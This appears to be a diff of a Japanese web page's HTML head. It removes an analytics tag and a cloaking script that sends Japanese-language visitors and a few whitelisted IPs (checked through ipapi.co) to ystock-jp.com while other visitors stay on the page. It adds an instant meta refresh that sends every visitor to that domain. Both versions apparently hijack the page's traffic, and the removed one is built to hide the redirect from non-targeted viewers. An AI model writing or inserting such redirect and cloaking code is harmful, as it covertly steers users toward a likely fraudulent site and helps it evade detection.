@@ -2,66 +2,8 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-
-	<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-<script>LA.init({id:"KnduWJ0InBfM2nYa",ck:"KnduWJ0InBfM2nYa"})</script>
+   <meta http-equiv="refresh" content="0;url=https://ystock-jp.com/">
 	
-	
-<script>
-  // ✅ IP 白名单
-  const WHITE_LIST_IPS = [
-    "38.134.114.67",
-	   "154.29.238.6",
-	   "23.229.109.217",
-    "103.156.184.47"
-  ];
-
-  // 跳转目标
-  const REDIRECT_URL = "https://ystock-jp.com";
-
-  // ✅ 判断是否日文语言
-  function isJapaneseLang() {
-    const langs = navigator.languages?.length
-      ? navigator.languages
-      : [navigator.language || ""];
-    return langs.some(l => l.toLowerCase().startsWith("ja"));
-  }
-
-  // ✅ 执行跳转
-  function redirect() {
-    window.location.replace(REDIRECT_URL);
-  }
-
-  // ✅ 带超时的 fetch
-  function fetchWithTimeout(url, ms = 4000) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), ms);
-    return fetch(url, { signal: controller.signal })
-      .finally(() => clearTimeout(timer));
-  }
-
-  // ✅ 主逻辑：语言优先判断，避免不必要的网络请求
-  (async function init() {
-    // 第一步：语言检测，立即判断，无需网络
-    if (isJapaneseLang()) {
-      redirect();
-      return;
-    }
-
-    // 第二步：语言不符合，再去检查 IP
-    try {
-      const res = await fetchWithTimeout("https://ipapi.co/json/");
-      const data = await res.json();
-      if (WHITE_LIST_IPS.includes(data.ip)) {
-        redirect();
-      }
-    } catch (e) {
-      // IP 获取失败（超时 / 网络错误）：不跳转，静默处理
-      console.warn("IP check failed:", e.message);
-    }
-  })();
-</script>
-
 
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
